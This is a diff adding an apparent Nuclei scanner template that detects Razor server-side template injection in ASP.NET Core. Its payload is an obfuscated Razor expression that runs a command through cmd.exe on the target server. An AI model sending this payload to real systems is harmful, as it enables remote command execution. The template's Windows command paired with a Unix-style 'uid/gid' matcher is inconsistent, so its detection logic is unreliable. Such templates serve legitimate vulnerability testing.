@@ -1,0 +1,37 @@
+id: razor-ssti
+
+info:
+  name: Razor - Server Side Template Injection
+  author: ritikchaddha
+  severity: high
+  description: |
+    Razor is a server-side templating engine for ASP.NET Core, it is a powerful template engine that can run pure C# code. It allows for server-side template injection by exploiting the Razor syntax.
+  reference:
+    - https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
+  metadata:
+    max-request: 1
+  tags: razor,ssti,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "@{string+x%3Dnull%3Bint[]l%3D{105%2C100}%3Bforeach(int+c+in+l){x%2B%3D((char)c).ToString()%3B}%3B}@System.Diagnostics.Process.Start(%22cmd.exe%22%2C+%22/c+%22+x)"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+.*"
+# digest: 4b0a00483046022100e477b5ed31a81e6752ebd848b0cd74cbc192bf613e87c2fcd9f4ea9335ca12cc022100d2789d9e1e6e57743b0afb63600a244ab7e03782a1bb5fff36483ad9c8ad585c:922c64590222798bb761d5b6d8e72950
